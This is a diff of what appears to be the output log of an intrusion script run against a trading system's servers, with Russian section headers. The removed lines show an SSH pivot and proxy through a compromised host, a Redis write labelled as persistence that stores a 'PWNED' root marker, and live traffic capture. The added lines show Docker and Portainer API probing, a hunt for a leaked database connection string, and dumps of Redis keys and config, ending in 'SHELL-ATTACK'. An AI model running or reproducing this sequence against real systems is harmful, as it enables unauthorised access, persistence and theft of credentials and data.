@@ -1,10 +1,78 @@
-=== SSH hung1 (паттерны Hung) ===
-=== POLIPO как прокси (доступ в интернет через hung1) ===
+=== 1. DOCKER API (2375/2376) ===
+=== 2. PORTAINER API ===
+STATUS: 
+ADMIN-CHECK: 
+=== 3. PG connection string leak (из Redis mt5:commands) ===
+*11
+$26
+mt5:ticks:EAERA MT5 - Live
+$38
+kalshi:symbols:active:EAERA MT5 - Live
+$37
+kalshi:symbols:purge:EAERA MT5 - Live
+$23
+mt5:commands:eaera-test
+$40
+kalshi:symbols:backfill:EAERA MT5 - Live
+$41
+kalshi:symbols:finalized:EAERA MT5 - Live
+$39
+mt5:server_time_offset:EAERA MT5 - Live
+$43
+kalshi:backfill:last_sweep:EAERA MT5 - Live
+$10
+cxp:anchor
+$19
+cms:action-requests
+$11
+mt5:results
 
-=== REDIS: ЗАКРЕПЛЕНИЕ (наш ключ) ===
-b'+OK\r\n'
-b'$64\r\n2026-09-09 PWNED hn-rack-node14 root github.com/s34vv1nd/ops-pub\r\n'
-=== REDIS: MONITOR проба (живой трафик) ===
-MONITOR: +OK
-+1788961244.142057 [0 172.18.0.8:46795] "XADD" "mt5:ticks:EAERA MT5 - Live" "MAXLEN" "~" "100000" "*" "event_id" "20563e06-dccc-409e-8604-01ffad1014b2" "server" "EAERA MT5 - Live" "symbol" "XAUUSD" "bid" "4419.96" "ask" "4420.34" "last" "0.0" "volume" "0.0" "timestamp" "2026-09-09T15:40:43.9530
-HUNG1-DONE
+
+mt5:commands:eaera-test: -WRONGTYPE Operation against a key holding the wrong kind of value
+
+
+cms:action-requests: -WRONGTYPE Operation against a key holding the wrong kind of value
+
+
+mt5:results: -WRONGTYPE Operation against a key holding the wrong kind of value
+
+=== 4. ALL REDIS CONFIG ===
+aclfile
+proto-max-bulk-len
+appendfilename
+appendonly.aof
+appendonly
+no-appendfsync-on-rewrite
+bgsave_cpulist
+tls-ca-cert-file
+dir
+stop-writes-on-bgsave-error
+tls-protocols
+pidfile
+logfile
+tls-client-cert-file
+bgsave-cpulist
+save
+tls-client-key-file
+tls-ca-cert-dir
+rdb-save-incremental-fsync
+rdb-del-sync-files
+tls-key-file-pass
+tls-client-key-file-pass
+dbfilename
+appenddirname
+appendonlydir
+cluster-config-file
+tls-cert-file
+enable-module-command
+appendfsync
+tls-key-file
+tls-dh-params-file
+=== 5. HTTP 8000/8080 полные ===
+8000:   HTTP/1.1 404 Not Found body=
+8080:   HTTP/1.1 200 OK body=<!doctype html>
+<html class="bg-base-200 text-base-content">
+  <head>
+    <meta charset="utf-8" />
+ 
+SHELL-ATTACK
